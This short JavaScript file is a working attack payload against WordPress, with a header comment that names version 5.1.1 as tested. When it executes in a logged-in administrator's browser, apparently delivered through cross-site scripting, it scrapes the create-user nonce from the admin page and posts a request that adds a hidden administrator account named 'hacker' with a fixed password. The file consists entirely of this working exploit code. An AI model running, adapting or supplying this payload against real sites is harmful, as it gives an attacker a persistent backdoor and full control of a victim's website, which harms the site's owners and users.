/*
Target: Wordpress - tested on 5.1.1 but probably works on other versions
Action: Create a new administrative user with username "hacker", email "hacker@example.com" and password "AttackerP455"
Context: Must be executed in the context of an administrator user
*/ 

var wp_root = "" // don't add a trailing slash
var req = new XMLHttpRequest();
var url = wp_root + "/wp-admin/user-new.php";
var regex = /ser" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=hacker@example.com&pass1=AttackerP455&pass2=AttackerP455&role=administrator";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
